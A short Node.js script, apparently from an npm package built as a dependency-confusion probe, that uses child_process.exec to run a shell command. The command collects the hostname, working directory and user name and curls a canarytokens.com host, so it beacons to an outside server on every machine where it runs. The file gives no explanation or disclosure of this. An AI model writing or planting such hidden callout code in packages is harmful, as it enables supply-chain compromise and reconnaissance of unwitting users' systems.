const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;echo 'kitabisa';curl zta8v4fve5jse1dc32rydaplv.canarytokens.com;)" , (error, data, getter) => {
	if(error){
		console.log("error",error.message);
		return;
	}
	if(getter){
		console.log(data);
		return;
	}
	console.log(data);
	
});
